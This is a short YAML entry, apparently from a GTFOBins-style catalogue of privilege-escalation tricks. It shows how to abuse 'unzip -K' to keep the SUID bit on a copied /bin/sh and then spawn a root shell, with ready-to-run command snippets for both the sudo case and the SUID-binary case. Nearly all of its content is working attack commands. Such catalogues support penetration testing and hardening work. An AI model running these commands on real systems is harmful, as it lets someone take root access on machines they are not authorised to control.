---
description: |
  Certain `unzip` versions allows to preserve the SUID bit. Prepare an archive beforehand with the following commands as root:

  ```
  cp /bin/sh .
  chmod +s sh
  zip shell.zip sh
  ```

  Extract it on the target, then run the SUID shell as usual (omitting the `-p` where appropriate).
functions:
  sudo:
    - code: |
        sudo unzip -K shell.zip
        ./sh -p
  suid:
    - code: |
        ./unzip -K shell.zip
        ./sh -p
---
